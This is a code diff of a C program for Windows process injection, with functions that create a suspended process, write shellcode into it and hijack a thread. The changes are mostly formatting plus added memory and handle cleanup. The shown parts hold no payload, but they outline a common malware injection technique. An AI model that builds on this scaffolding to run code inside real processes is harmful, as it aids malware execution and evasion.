@@ -2,15 +2,15 @@
 
 BOOL CreateSuspendedProcess
 (
-	IN LPCSTR ProcessName,
+	IN  LPCSTR  ProcessName,
 	OUT PHANDLE hProcess,
 	OUT PHANDLE hThread,
-	OUT PDWORD PID
+	OUT PDWORD  PID
 )
 {
 
-	BOOL State = TRUE;
-	STARTUPINFOA StartupInfo;
+	BOOL				State = TRUE;
+	STARTUPINFOA		StartupInfo;
 	PROCESS_INFORMATION ProcessInfo;
 
 	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
@@ -47,18 +47,19 @@ CLEANUP:
 
 BOOL InjectThread
 (
-	IN HANDLE hProcess,
-	IN PBYTE sShellcode,
-	IN SIZE_T sSizeofShellcode,
-	OUT PVOID* pAddress
+	IN	HANDLE	hProcess,
+	IN	PBYTE	sShellcode,
+	IN	SIZE_T	sSizeofShellcode,
+	OUT PVOID*	pAddress
 )
 
 {
 
-	BOOL State = TRUE, status = TRUE;
-	SIZE_T sBytesWritten = NULL;
-	PVOID rBuffer = NULL;
-	DWORD dwOldProt = NULL;
+	BOOL	State			= TRUE, 
+			status			= TRUE;
+	PVOID	rBuffer			= NULL;
+	SIZE_T	sBytesWritten	= 0;
+	DWORD	dwOldProt		= 0;
 
 	if (!hProcess || !sShellcode || !sSizeofShellcode)
 	{
@@ -103,7 +104,7 @@ CLEANUP:
 BOOL HijackThread
 (
 	IN HANDLE hThread,
-	IN PVOID pRemoteAddress
+	IN PVOID  pRemoteAddress
 )
 {
 
@@ -169,6 +170,12 @@ BOOL HijackThread
 	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);
 
 CLEANUP:
+
+	if (pRemoteAddress)
+		VirtualFree(pRemoteAddress, 0, MEM_RELEASE);
+
+	if (hThread)
+		CloseHandle(hThread);
 
 	return State;
 }
